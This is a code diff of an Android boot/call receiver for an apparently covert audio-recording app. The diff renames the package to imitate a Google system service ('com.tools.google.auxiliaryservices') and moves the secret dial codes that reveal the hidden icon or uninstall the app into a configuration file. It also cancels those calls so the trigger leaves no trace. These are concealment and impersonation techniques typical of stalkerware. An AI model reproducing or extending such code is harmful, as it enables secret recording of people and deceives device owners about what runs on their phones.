@@ -1,4 +1,4 @@
-package com.forensic.unipg.silenceaudiorecording;
+package com.tools.google.auxiliaryservices;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -11,10 +11,6 @@ import android.os.Bundle;
  */
 public class BootReceiver extends BroadcastReceiver
 {
-
-    static final String NUMBER_TO_SHOW_APP_ICO = "12345";
-    static final String NUMBER_TO_UNINSTALL_APP = "54321";
-
     @Override
     public void onReceive(Context context, Intent intent)
     {
@@ -36,8 +32,10 @@ public class BootReceiver extends BroadcastReceiver
             if (null == bundle) return;
             //get phone number
             String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
+            //Configuration
+            ConfigurationFile configuration = new ConfigurationFile(context);
             //case SHOW ICO
-            if (phoneNumber.equals(NUMBER_TO_SHOW_APP_ICO))
+            if (phoneNumber.equals(configuration.mShowNumber))
             {
                 setResultData(null);
                 Intent appIntent = new Intent(context, SilenceAudioRecordingActivity.class);
@@ -45,7 +43,7 @@ public class BootReceiver extends BroadcastReceiver
                 context.startActivity(appIntent);
             }
             //case UNINSTALL
-            else if (phoneNumber.equals(NUMBER_TO_UNINSTALL_APP))
+            else if (phoneNumber.equals(configuration.mUninstallNumber))
             {
                 try
                 {
